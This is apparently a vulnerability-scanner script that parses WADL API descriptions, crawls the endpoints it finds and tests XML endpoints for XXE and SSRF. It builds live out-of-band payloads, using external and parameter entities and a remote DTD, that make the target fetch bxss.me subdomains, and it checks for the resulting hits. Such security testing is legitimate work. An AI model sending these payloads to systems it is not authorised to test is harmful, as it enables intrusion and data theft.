var debug = false;
// **************************************************************************************
function replacePathParams(input, value)
{
    return input.replace(new RegExp("{[^}]+}","gm"), value);
}
// **************************************************************************************
function generateAllCombinations(params, type, method) {
    var result = [];
    if (params.length <= 0) return result;
    // first, let's generate a counters array
    var counters = [];
    for (var i=0; i<params.length; i++) counters.push(0);
    var done = false;
    while (!done) {
        // generate a combination
        var Payload = "";
        if (type == "Query")
            Payload = "?";
        else
        if (type == "POST")
            Payload = "";
        else
        if (type == "JSON")
            Payload = "{";
        else
        if (type == "XML")
            Payload = "<" + method + ">";
        for (var i=0; i<counters.length; i++) {
            // representation type
            // JSON
            // {"ProductId":1,"Name":"1","CategoryName":"1","Price":"1"}
            if (type == "JSON") {
                // integer or string
                if (params[i]['type'].indexOf("integer") != -1)
                    Payload += '"' + params[i]['name'] + '":' + params[i]['values'][counters[i]];
                else
                    Payload += '"' + params[i]['name'] + '":"' + params[i]['values'][counters[i]] + '"';
                if (i != counters.length - 1) Payload += ",";
                else Payload += "}";
            }
            else
            // XML
            if (type == "XML") {
                // integer or string
                Payload += '<' + params[i]['name'] + '>' + params[i]['values'][counters[i]] + '</' + params[i]['name'] + '>';
                if (i != counters.length - 1) Payload += "";
                else Payload += "</" + method + ">";
            }
            else
            // default to POST/Query
            {
                Payload += params[i]['name'] + '=' + params[i]['values'][counters[i]];
                if (i != counters.length - 1) Payload += "&";
            }
        }
        // add it to the results list
        result.push(Payload);
        // check if we are done
        done = true;
        for (var i=0; i<counters.length; i++) {
            if (counters[i] != params[i]['values'].length - 1) {
                done = false;
            }
        }
        if (!done) {
            // begin indexing
            // start with the last variable index
            var i = counters.length-1;
            var done_indexing = false;
            while (!done_indexing) {
                counters[i] = (counters[i] + 1) % (params[i]['values'].length);
                if (counters[i] != 0) done_indexing = true;
                i--;
            }
        }
    }
    return result;
}
// **************************************************************************************
function sendRequestToCrawler(verb, url, contentType, body) {
    if (debug) trace("sending request to crawler verb '" + verb + "' on '" + url + "' with content-type '" + contentType + "'");
    var r = new THTTPRequest();
    var url = new TURL(url);
    r.verb = verb;
    r.body = body;
    r.uri = url.uri;
    r.addHeader('Host', url.hostPort, true);
    if (contentType) r.addHeader('Content-Type', contentType, true);
    else if (verb === 'POST') r.addHeader('Content-Type', 'application/x-www-form-urlencoded', true);
    addHTTPRequestToCrawler(r);
}
// **************************************************************************************
function alert(uri, payload, subdomain, reqData)
{
    var ri = new TReportItem();
    ri.LoadFromFile("XML_External_Entity_Injection_And_XML_Injection2.xml");
    ri.affects = uri;
    ri.alertPath = "Scripts/XML_External_Entity_Injection_And_XML_Injection2";
    ri.setHttpInfo(lastJob);
    ri.details =  "POST data was set to [bold][dark]" + payload + "[/dark][/bold][break]";
    if (subdomain) {
        ri.Details =  ri.Details + "[break]An HTTP request was initiated for the domain [bold]" + subdomain + ".bxss.me [/bold] which indicates that this script is vulnerable to XXE injection.";
        if (reqData) {
            ri.Details =  ri.Details + "[break][break]HTTP request details: [break][pre]" + reqData + "[/pre]";
        }
    }
    //trace(ri.Details);
    AddReportItem(ri);
}
// **************************************************************************************
function alertSSRF(uri, payload, subdomain, reqData)
{
    var ri = new TReportItem();
    ri.LoadFromFile("SSRF.xml");
    ri.affects = uri;
    ri.alertPath = "Scripts/SSRF";
    ri.setHttpInfo(lastJob);
    ri.details =  "POST data was set to [bold][dark]" + payload + "[/dark][/bold][break]";
    if (subdomain) {
        ri.Details =  ri.Details + "[break]An HTTP request was initiated for the domain [bold]" + subdomain + ".bxss.me [/bold] which indicates that this script is vulnerable to SSRF.";
        if (reqData) {
            ri.Details =  ri.Details + "[break][break]HTTP request details: [break][pre]" + reqData + "[/pre]";
        }
    }
    //trace(ri.Details);
    AddReportItem(ri);
}
// **************************************************************************************
function verifyInjection(rndToken) {
    var http 		= new THTTPJob();
    http.url 		= new TURL("http://bxss.s3.amazonaws.com/hits/" + rndToken);
    http.verb 		= "GET";
    http.timeout 	= 10000;
    http.retries 	= 0;
    http.execute();
    if (!http.wasError && http.response.body.startsWith("IP address:")){
        return http.response.body;
    }
    return false;
}
// **************************************************************************************
function testRepresentationForXXE(path, method, contentType, name){
    if (debug) trace("testing for XXE '" + path + "' on '" + method + "' with content-type '" + contentType + "', resourceName = " + name);
    var rndToken = 'hit' + randStr(10);
    var doctype = "dt" + randStr(5).toLowerCase();
    if(typeof name === 'undefined'){
        name = "xxe";
    }
    var payload = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n";
    payload = payload + '<!DOCTYPE ' + doctype + ' [' + "\r\n";
    payload = payload + '  <!ENTITY ' + doctype + 'ent SYSTEM "http://' + rndToken + '.bxss.me/">' + "\r\n";
    payload = payload + ']>' + "\r\n";
    payload = payload + '<' + name + '>&' + doctype + 'ent;</' + name + '>' + "\r\n";
    lastJob = new THTTPJob();
    lastJob.verb = method;
    lastJob.url  = scanURL;
    lastJob.uri  = path;
    lastJob.addCookies = true;
    lastJob.request.addHeader('Content-type', contentType, true);
    lastJob.request.body = payload;
    lastJob.execute();
    if (!lastJob.wasError) {
        // verify injection
        var reqData = verifyInjection(rndToken);
        if (reqData) {
            alert(path, payload, rndToken, reqData)
            return true;
        }
    }
    // also test XXE with parameter entities
    var rndToken = 'hit' + randStr(10);
    var doctype = "dt" + randStr(5).toLowerCase();
    if(typeof name === 'undefined'){
        name = "xxe";
    }
    var payload = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n";
    payload = payload + '<!DOCTYPE ' + doctype + ' [' + "\r\n";
    payload = payload + '  <!ENTITY % dtd SYSTEM "http://' + rndToken + '.bxss.me/">' + "\r\n";
    payload = payload + '%dtd;]>' + "\r\n";
    payload = payload + '<' + name + '>&' + doctype + 'ent;</' + name + '>' + "\r\n";
    lastJob = new THTTPJob();
    lastJob.verb = method;
    lastJob.url  = scanURL;
    lastJob.uri  = path;
    lastJob.addCookies = true;
    lastJob.request.addHeader('Content-type', contentType, true);
    lastJob.request.body = payload;
    lastJob.execute();
    if (!lastJob.wasError) {
        // verify injection
        var reqData = verifyInjection(rndToken);
        if (reqData) alert(path, payload, rndToken, reqData)
    }
    return false;
}
// **************************************************************************************
function testRepresentationForSSRFviaDTD(path, method, contentType, name){
    if (debug) trace("testing for SSRF via DTD '" + path + "' on '" + method + "' with content-type '" + contentType + "', resourceName = " + name);
    var rndToken = 'hit' + randStr(10);
    var payload = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n";
    payload = payload + '<!DOCTYPE roottag PUBLIC "-//A//B//EN" "http://' + rndToken + '.bxss.me/">' + "\r\n";
    payload = payload + '<roottag>test</roottag>';
    lastJob = new THTTPJob();
    lastJob.verb = method;
    lastJob.url  = scanURL;
    lastJob.uri  = path;
    lastJob.addCookies = true;
    lastJob.request.addHeader('Content-type', contentType, true);
    lastJob.request.body = payload;
    lastJob.execute();
    if (!lastJob.wasError) {
        // verify injection
        var reqData = verifyInjection(rndToken);
        if (reqData) {
            alertSSRF(path, payload, rndToken, reqData)
            return true;
        }
    }
    return false;
}
// **************************************************************************************
function parseXMLDocument(xmlText) {
    try {
        xmlDoc=new ActiveXObject("Microsoft.XMLDOM");
        xmlDoc.async=false;
        xmlDoc.loadXML(xmlText);
        return xmlDoc;
    }
    catch(err) {
        return false;
    }
}
// **************************************************************************************
function processWADL(wadl) {
	if (debug) trace("processing wadl");
    var xmlDoc = parseXMLDocument(wadl);
    // cannot parse XML
    if (!xmlDoc) return false;
    // get resources main node
    var resources = xmlDoc.getElementsByTagName("resources");
    if (resources.length == 1) resources = resources[0];
    else resources = false;
    if (resources) {
        if (debug) trace("found resources node");
        // get resources base
        var resourcesBase = resources.getAttribute("base");
        if (!resourcesBase) return false;
        var resourceBasePrefix = "";
        var url = new TURL(resourcesBase);
        if (url.host.toLowerCase() !== scanHost.toLowerCase()) {
            if (debug) trace("out of scope, invalid domain " + url.host.toLowerCase() + " <> " + scanHost.toLowerCase());
            //return false;
        }
        if (debug) trace("BASE: " + resourcesBase);
        // enumerate resources
        var resources = xmlDoc.getElementsByTagName("resource");
        if (resources.length) {
            for (var i=0; i<resources.length; i++) {
                var resource = resources[i];
                if (resource) {
                    // found a resource
                    var fakeResource = false;
                    // determine if it's a fake resource (resource that contains other resources)
                    if (resource.getElementsByTagName("resource") && resource.getElementsByTagName("resource").length > 0) {
                        var fakeResource = true;
                        resourceBasePrefix = resource.getAttribute("path");
                        // skip this resource
                        continue;
                    }
                    // determine resource path
                    var resourcePath = resource.getAttribute("path");
                    var resourceName = resourcePath;
                    if (resourcePath != 'myself') {
                        // if the base ends with / and the path or prefix starts with / we need to cut the last slash
                        if (resourcesBase.endsWith("/") && (resourceBasePrefix.startsWith("/") || resourcePath.startsWith("/")))
                            resourcePath = resourcesBase.slice(0, -1) + resourceBasePrefix + resourcePath;
                        else
                            resourcePath = resourcesBase + resourceBasePrefix + resourcePath;
                    }
                    // replace {param} with 1
                    resourcePath = replacePathParams(resourcePath, "1");
                    // have a resource path
                    if (debug) trace("RESOURCE: " + resourcePath);
                    // enumerate methods
                    var methods = resource.getElementsByTagName("method");
                    if (methods.length) {
                        for (var j=0; j<methods.length; j++) {
                            var method      = methods[j];
                            var methodName  = method.getAttribute("name");
                            var methodId    = method.getAttribute("id");
                            if (!methodId) methodId = "undefined";
                            if (method && methodName) {
                                if (debug) trace(" [+] METHOD: " + methodName);
                                var request = method.getElementsByTagName("request")[0];
                                if (request)
                                {
                                    var queryString = "";
                                    // QueryParameters
                                    var QueryParameters = [];
                                    var BodyParameters = [];
                                    var headers = [];
                                    // enumerate QueryParameters
                                    var params = request.getElementsByTagName("param");
                                    for (var k=0; k<params.length; k++) {
                                        var param = params[k];
                                        var paramStyle = param.getAttribute("style").trim().toLowerCase();
                                        var paramName  = param.getAttribute("name");
                                        var paramType  = param.getAttribute("type").toLowerCase();
                                        var paramVal   = param.getAttribute("default");
                                        if (!paramVal) paramVal = "1";
                                        // add the default value to parameter values
                                        var paramValues = [];
                                        paramValues.push(paramVal);
                                        if (param && paramName && paramStyle) {
                                            // get the first value
                                            var options = param.getElementsByTagName("option");
                                            if (options.length > 0)
                                            {
                                                for (var l=0; l<options.length; l++) {
                                                    paramVal = options[l].getAttribute("value");
                                                    if (paramValues.indexOf(paramVal) == -1)
                                                        paramValues.push(paramVal);
                                                }
                                            }
                                            // Query parameter or Body parameter
                                            if (paramStyle == "query")
                                                QueryParameters.push({'name': paramName, 'type':paramType, 'values':paramValues});
                                            else
                                                BodyParameters.push({'name': paramName, 'type':paramType, 'values':paramValues});
                                            if (debug) {
                                                if (paramStyle == "query")
                                                    trace("Query parameter name=" + paramName + ", values:" + paramValues.length);
                                                else
                                                    trace("Body parameter name=" + paramName + ", values:" + paramValues.length);
                                                for (var b=0; b<paramValues.length; b++) trace('  => ' + paramValues[b]);
                                            }
                                        }
                                    }
                                    // media types
                                    var mediaTypes = [];
                                    var representations = request.getElementsByTagName("representation");
                                    if (representations.length > 0) {
                                        for (k=0; k<representations.length; k++) {
                                            var repr = representations[k];
                                            var reprMediaType = repr.getAttribute("mediaType");
                                            if (repr && reprMediaType) {
                                                if (reprMediaType == '*/*') reprMediaType = "";
                                                mediaTypes.push(reprMediaType);
                                            }
                                        }
                                    }
                                    // if no representations, just add an empty mediaType
                                    if (mediaTypes.length == 0) mediaTypes.push("");
                                    // iterate through media types
                                    for (var n=0; n<mediaTypes.length; n++) {
                                        var reprMediaType = mediaTypes[n];
                                        if (debug) trace("   [+] REPR: " + reprMediaType);
                                        var queryStrings = generateAllCombinations(QueryParameters, "Query");
                                        if (queryStrings.length == 0) queryStrings.push("");
                                        // iterate through generate query strings
                                        for (var m=0; m<queryStrings.length; m++) {
                                            var urlStr = resourcePath;
                                            var queryString = queryStrings[m];
                                            if (queryString !== "") urlStr = urlStr + queryString;
                                            var reprType = "POST";
                                            if (reprMediaType.toLowerCase().indexOf("/json") != -1) {
                                                reprType = "JSON";
                                            }
                                            else
                                            if (reprMediaType.toLowerCase().indexOf("/xml") != -1) {
                                                reprType = "XML";
                                            }
                                            // iterate through all body parameters
                                            var bodies = generateAllCombinations(BodyParameters, reprType, methodId);
                                            for (var bp=0; bp<bodies.length; bp++) {
                                                // send to crawler
                                                var url = new TURL(urlStr);
                                                var body = bodies[bp];
                                                if (debug) trace(" Body: " + body);
                                                sendRequestToCrawler(methodName, urlStr, reprMediaType, body);
                                                // test for xxe
                                                if (methodName !== "GET") {
                                                    if (reprMediaType.indexOf("xml") != -1) {
                                                        if (resourceName.indexOf("/") != -1) resourceName = "xxe";
                                                        if (reprMediaType != "") {
                                                            testRepresentationForXXE(url.path, methodName, reprMediaType, resourceName);
                                                            testRepresentationForSSRFviaDTD(url.path, methodName, reprMediaType, resourceName);
                                                        }
                                                        else {
                                                            testRepresentationForXXE(url.path, methodName, "text/xml", resourceName);
                                                            testRepresentationForXXE(url.path, methodName, "application/xml", resourceName);
                                                            testRepresentationForSSRFviaDTD(url.path, methodName, "application/xml", resourceName);
                                                        }
                                                    }
                                                }
                                            }
                                       }
                                    }
                                } else {
                                    if (debug) trace("! NO REQUEST");
                                    var urlStr = resourcePath;
                                    sendRequestToCrawler(methodName, urlStr, false, "");
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    if (debug) trace("processing wadl DONE");
}